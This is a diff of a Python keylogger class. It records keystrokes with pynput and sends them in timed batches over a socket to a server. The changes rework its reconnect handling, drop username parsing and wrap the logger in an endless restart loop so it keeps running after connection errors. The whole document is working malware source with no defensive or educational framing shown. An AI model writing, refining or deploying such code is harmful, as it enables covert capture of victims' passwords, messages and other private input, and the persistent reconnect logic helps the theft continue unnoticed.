@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 from pynput import keyboard
-from threading import Timer
+from threading import Timer, Thread
 from time import sleep
 import socket
 import errno
@@ -28,8 +28,8 @@ class Keylogger:
     def _reconnect(self):
         while True:
             try:
-                self.client_socket.close()
-                self._connect()
+                if self.client_socket!=None:
+                    self.client_socket.close()
             except Exception as e:
                 print(e)
                 sleep(5)
@@ -64,8 +64,6 @@ class Keylogger:
                 username_header = self.client_socket.recv(self.header_lenght)
                 if not len(username_header):
                     raise ConnectionError
-                username_length = int(username_header.decode('utf-8').strip())
-                username = self.client_socket.recv(username_length).decode('utf-8')
                 message_header = self.client_socket.recv(self.header_lenght)
                 message_length = int(message_header.decode('utf-8').strip())
                 message = self.client_socket.recv(message_length).decode('utf-8')
@@ -78,12 +76,7 @@ class Keylogger:
 
     # function to print the user input in the given interval
     def _report(self):
-        try:
-            self._send_2_server()
-        except ConnectionError as e:
-            print(e)
-            self._reconnect()
-            self._send_2_server()
+        self._send_2_server()
         self.log = ""
         timer = Timer(self.interval, self._report)
         timer.start()
@@ -93,12 +86,21 @@ class Keylogger:
         keyboard_listener = keyboard.Listener(on_press=self._process_pressed_key)
         with keyboard_listener:
             # starts sending keys to server
-            self._report()
+            try:
+                self._report()
+            except ConnectionError:
+                keyboard_listener.join()
             # waiting the listener to finish
             keyboard_listener.join()
 
 
-# adding a print interval of 10 seconds
-keylogger = Keylogger(10, "127.0.0.1", 11234, 10)
-# starting the keyloggger
-keylogger.start()
+while (True):
+    try:
+        # adding a print interval of 10 seconds
+        keylogger = Keylogger(10, "127.0.0.1", 11234, 10)
+        # starting the keyloggger
+        keylogger.start()
+    except ConnectionError as e:
+        print(e)
+        sleep(3)
+        continue
